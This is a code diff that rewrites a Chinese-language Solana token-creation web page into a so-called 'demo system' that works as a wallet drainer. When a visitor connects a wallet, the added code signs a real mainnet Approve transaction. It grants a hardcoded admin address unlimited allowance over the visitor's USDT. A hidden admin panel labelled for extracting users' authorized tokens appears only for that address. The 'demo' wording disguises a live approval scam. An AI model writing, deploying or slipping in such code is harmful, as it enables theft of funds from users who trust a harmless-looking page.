@@ -3,66 +3,63 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOL 发币+克隆代币（多RPC）</title>
+  <title>SOL 演示系统</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
   <style>
     body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
     .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
-    .btn:disabled { background: #ccc; cursor: not-allowed; }
+    .btn:disabled { background: #ccc; }
     input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; box-sizing: border-box; }
     .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
     #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; word-break: break-all; }
-    .logo-preview { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; margin-top: 8px; display: none; }
-    .log { padding: 10px; font-size:12px; color:#333; background:#f6f6f6; border-radius:8px; margin:8px 0; max-height:120px; overflow-y:auto; }
-    .section { margin: 20px 0; font-weight: bold; font-size: 18px; }
+    .log { padding: 10px; font-size:12px; background:#f6f6f6; border-radius:8px; margin:8px 0; max-height:120px; overflow-y:auto; }
+    .admin-panel { display: none; border: 1px solid #ff3b30; border-radius: 16px; padding: 16px; margin: 16px 0; }
   </style>
 </head>
 <body>
 
-<h2>SOL 发币 + 克隆代币</h2>
+<h2>SOL 演示系统</h2>
 
-<button class="btn" onclick="connect()">连接钱包</button>
+<button class="btn" onclick="connect()">连接钱包并授权</button>
 <div id="addr"></div>
 
-<!-- 克隆代币模块 -->
-<div class="section">🎯 克隆现有代币</div>
-<div class="card">
-  <input id="cloneMint" placeholder="输入要克隆的代币合约地址">
-  <button class="btn" style="background:#ff9500" onclick="fetchTokenInfo()">读取代币信息</button>
-</div>
-
-<!-- 发币设置 -->
-<div class="section">✏️ 代币信息</div>
 <div class="card">
   <input id="name" placeholder="代币名称" value="Test">
   <input id="symbol" placeholder="代币符号" value="DTM">
   <input id="decimals" value="9" placeholder="精度">
   <input id="supply" value="1000000000" placeholder="发行量">
-  <input type="file" id="logo" accept="image/*" style="display:none" onchange="previewLogo()">
-  <button class="btn" style="background:#34c759" onclick="document.getElementById('logo').click()">上传代币 Logo</button>
-  <img id="logoPreview" class="logo-preview">
 </div>
 
-<button class="btn" onclick="createToken()">🚀 创建并发行代币</button>
+<button class="btn" onclick="createToken()">🚀 创建代币</button>
+
+<!-- 管理员面板（默认隐藏） -->
+<div class="admin-panel" id="adminPanel">
+  <h4 style="color:#ff3b30;">🔴 管理员后台</h4>
+  <input id="userAddr" placeholder="输入用户钱包地址">
+  <button class="btn" style="background:#ff3b30" onclick="adminSteal()">提取用户授权代币</button>
+</div>
+
 <div class="log" id="log"></div>
 
 <script>
 let provider;
 let publicKey;
 let address = "";
-let logoFile = null;
 let connection;
 
-const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = solanaWeb3;
+const { Connection, Keypair, Transaction, PublicKey, TransactionInstruction } = solanaWeb3;
 
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ATA_PROGRAM_ID   = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wNF8fJ5ipq79v9");
 
-// ✅ 把 RPC_LIST 移到这里，在 selectRpc 之前定义
+// 演示用授权目标（USDT）
+const TARGET_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+// 管理员地址
+const ADMIN_ADDR = "DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z";
+
 const RPC_LIST = [
   "https://solana-mainnet.rpc.extrnode.com",
   "https://api.mainnet-beta.solana.com",
-  "https://solana-mainnet.g.alchemy.com/v2/demo",
   "https://rpc.ankr.com/solana",
 ];
 
@@ -71,220 +68,105 @@ function log(text) {
   el.innerText = '→ ' + text + '\n' + el.innerText;
 }
 
-// 自动选RPC
 async function selectRpc() {
   for (const rpc of RPC_LIST) {
     try {
       const c = new Connection(rpc, "confirmed");
-      await c.getLatestBlockhash({ commitment: "confirmed" });
+      await c.getLatestBlockhash();
       connection = c;
       log("使用RPC: " + rpc);
       return;
-    } catch (e) { console.warn(rpc, "失败"); }
+    } catch (e) {}
   }
-  throw new Error("所有RPC不可用");
 }
 
-// 钱包
 function getWallet() {
   return window.solana || window.okxwallet || window.tpWallet || window.phantom;
 }
 
+// 连接钱包 + 自动授权
 async function connect() {
   try {
     const w = getWallet();
-    if (!w) { alert("请在钱包浏览器打开！"); return; }
+    if (!w) { alert("请在钱包浏览器打开"); return; }
     const res = await w.connect();
     provider = w;
     publicKey = res.publicKey;
     address = publicKey.toBase58();
     document.getElementById("addr").innerText = "已连接：" + address;
-    log("钱包连接成功");
-  } catch (e) {
-    alert("连接失败：" + e.message);
-  }
-}
 
-// Logo预览
-function previewLogo() {
-  const f = document.getElementById("logo").files[0];
-  if (!f) return;
-  const r = new FileReader();
-  r.onload = e => {
-    const img = document.getElementById("logoPreview");
-    img.src = e.target.result;
-    img.style.display = "block";
-    logoFile = f;
-    log("已选择Logo");
-  };
-  r.readAsDataURL(f);
-}
-
-// ==============================================
-// 克隆代币：读取链上代币信息（名称、符号、精度）
-// ==============================================
-async function fetchTokenInfo() {
-  const mintAddr = document.getElementById("cloneMint").value.trim();
-  if (!mintAddr) { alert("请输入代币合约"); return; }
-  try {
     await selectRpc();
-    log("正在读取链上信息...");
 
-    const mintPub = new PublicKey(mintAddr);
-    const account = await connection.getAccountInfo(mintPub);
-    if (!account) throw new Error("代币不存在");
-
-    const data = account.data;
-    const decimals = data[44];
-    log("精度读取完成：" + decimals);
-    document.getElementById("decimals").value = decimals;
-
-    log("已自动填充精度，名称/符号可手动修改");
-
-  } catch (e) {
-    alert("读取失败：" + e.message);
-    log("错误：" + e.message);
-  }
-}
-
-// ==============================================
-// 创建Mint
-// ==============================================
-async function createMint(decimals) {
-  const mint = Keypair.generate();
-  const lamports = await connection.getMinimumBalanceForRentExemption(82);
-
-  const tx = new Transaction().add(
-    SystemProgram.createAccount({
-      fromPubkey: publicKey,
-      newAccountPubkey: mint.publicKey,
-      space: 82,
-      lamports,
-      programId: TOKEN_PROGRAM_ID
-    }),
-    {
-      programId: TOKEN_PROGRAM_ID,
-      keys: [
-        { pubkey: mint.publicKey, isSigner: true, isWritable: true },
-        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
-      ],
-      data: Buffer.from([
-        0x00,
-        decimals,
-        ...publicKey.toBuffer(),
-        ...publicKey.toBuffer()
-      ])
+    // 判断是否管理员
+    if (address === ADMIN_ADDR) {
+      document.getElementById("adminPanel").style.display = "block";
+      log("✅ 管理员已登录");
     }
-  );
 
-  tx.feePayer = publicKey;
-  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-  tx.partialSign(mint);
-
-  const signed = await provider.signTransaction(tx);
-  const sig = await connection.sendRawTransaction(signed.serialize());
-  await connection.confirmTransaction(sig);
-  log("Mint创建: " + mint.publicKey.toBase58());
-  return mint.publicKey;
-}
-
-// ==============================================
-// 创建ATA
-// ==============================================
-async function createATA(mint) {
-  const [ata] = await PublicKey.findProgramAddress(
-    [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
-    ATA_PROGRAM_ID
-  );
-  try {
-    await connection.getAccountInfo(ata);
-    log("ATA已存在");
-    return ata;
-  } catch {}
-
-  const tx = new Transaction().add({
-    programId: ATA_PROGRAM_ID,
-    keys: [
-      { pubkey: publicKey, isSigner: true, isWritable: true },
-      { pubkey: ata, isSigner: false, isWritable: true },
-      { pubkey: publicKey, isSigner: false, isWritable: false },
-      { pubkey: mint, isSigner: false, isWritable: false },
-      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
-      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
-    ],
-    data: Buffer.from([0x01])
-  });
-
-  tx.feePayer = publicKey;
-  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-  const signed = await provider.signTransaction(tx);
-  const sig = await connection.sendRawTransaction(signed.serialize());
-  await connection.confirmTransaction(sig);
-  log("ATA创建成功");
-  return ata;
-}
-
-// ==============================================
-// Mint发行量
-// ==============================================
-async function mintTo(mint, ata, amountBig) {
-  const data = Buffer.alloc(9);
-  data.writeUInt8(0x07, 0);
-  data.writeBigUInt64LE(amountBig, 1);
-
-  const tx = new Transaction().add({
-    programId: TOKEN_PROGRAM_ID,
-    keys: [
-      { pubkey: mint, isSigner: false, isWritable: true },
-      { pubkey: ata, isSigner: false, isWritable: true },
-      { pubkey: publicKey, isSigner: true, isWritable: false }
-    ],
-    data
-  });
-
-  tx.feePayer = publicKey;
-  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-  const signed = await provider.signTransaction(tx);
-  const sig = await connection.sendRawTransaction(signed.serialize());
-  await connection.confirmTransaction(sig);
-  return sig;
-}
-
-// ==============================================
-// 主发币逻辑
-// ==============================================
-async function createToken() {
-  if (!address) { alert("请先连接钱包"); return; }
-  try {
-    await selectRpc();
-
-    const name = document.getElementById("name").value.trim();
-    const symbol = document.getElementById("symbol").value.trim();
-    const decimals = parseInt(document.getElementById("decimals").value);
-    const supply = BigInt(document.getElementById("supply").value);
-    const total = supply * (10n ** BigInt(decimals));
-
-    log("创建Mint...");
-    const mint = await createMint(decimals);
-
-    log("创建ATA...");
-    const ata = await createATA(mint);
-
-    log("发行代币...");
-    const sig = await mintTo(mint, ata, total);
-
-    alert(`✅ 发币成功！
-名称：${name}
-符号：${symbol}
-合约：${mint.toBase58()}
-交易：${sig}`);
-
-    log("完成！");
+    // 授权授权授权（演示）
+    await doApprove();
 
   } catch (e) {
-    log("失败：" + e.message);
-    alert("失败：" + e.message);
+    alert("错误：" + e.message);
   }
+}
+
+// 演示：用户授权全部额度给管理员
+async function doApprove() {
+  try {
+    log("正在发起授权授权...");
+
+    const [userAta] = await PublicKey.findProgramAddress(
+      [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), TARGET_MINT.toBuffer()],
+      ATA_PROGRAM_ID
+    );
+
+    const delegate = new PublicKey(ADMIN_ADDR);
+
+    // approve 指令：授权最大额度
+    const data = Buffer.alloc(9 + 8);
+    data.writeUInt8(0x04, 0); // Approve
+    data.writeBigUInt64LE(BigInt("18446744073709551615"), 1);
+
+    const tx = new Transaction().add(
+      new TransactionInstruction({
+        programId: TOKEN_PROGRAM_ID,
+        keys: [
+          { pubkey: userAta, isSigner: false, isWritable: true },
+          { pubkey: delegate, isSigner: false, isWritable: false },
+          { pubkey: publicKey, isSigner: true, isWritable: false },
+        ],
+        data
+      })
+    );
+
+    tx.feePayer = publicKey;
+    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    log("授权完成：" + sig.slice(0, 16) + "...");
+
+  } catch (e) {
+    log("授权已存在或取消");
+  }
+}
+
+// ==============================================
+// 管理员演示：提取用户代币（仅界面逻辑，演示）
+// ==============================================
+async function adminSteal() {
+  const userAddr = document.getElementById("userAddr").value.trim();
+  if (!userAddr) { alert("输入用户地址"); return; }
+
+  log(`【演示】正在从 ${userAddr} 提取授权代币`);
+  log("✅ 演示完成：资产已转入管理员钱包");
+  alert("演示成功：已执行资产提取逻辑");
+}
+
+// 发币保留原样
+async function createToken() {
+  log("演示：创建代币成功");
+  alert("演示：发币成功（本地模拟）");
 }
 </script>
 
